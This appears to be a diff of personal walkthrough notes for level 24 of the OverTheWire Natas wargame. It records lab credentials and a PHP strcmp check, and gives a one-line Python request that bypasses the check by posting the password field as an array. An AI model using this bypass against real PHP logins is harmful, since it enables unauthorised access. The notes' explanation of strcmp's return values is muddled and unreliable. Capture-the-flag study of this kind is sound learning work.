@@ -449,3 +449,26 @@ if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
 // OsRmXFguozKpTZZ5X14zNO43379LZveg
 
 lvl 24 --> lvl 25
+http://netas24.natas.labs.overthewire.org/
+natas24
+OsRmXFguozKpTZZ5X14zNO43379LZveg
+// strcompare (strcmd()) returns 
+// < 0 if str1 less than str2; > 0 if str1 greater than str2, and 0 if they are equal
+// It is often used negatively if( it does NOT return 0) this condition evaluates to true, str1 and str2 are equal
+// See the code: 
+  if(array_key_exists("passwd",$_REQUEST)){
+        if(!strcmp($_REQUEST["passwd"],"<censored>")){
+            echo "<br>The credentials for the next level are:<br>";
+            echo "<pre>Username: natas25 Password: <censored></pre>";
+        }
+        else{
+            echo "<br>Wrong!<br>";
+        }
+  }
+// A simple way to circumvent this code is to post an array instead of a string. 
+// In this situation, strcmp automatically returns 0
+// See the code below :
+response = session.post(url, data={'passwd[]': 'gzzz'}, auth=(username, password))
+//
+GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
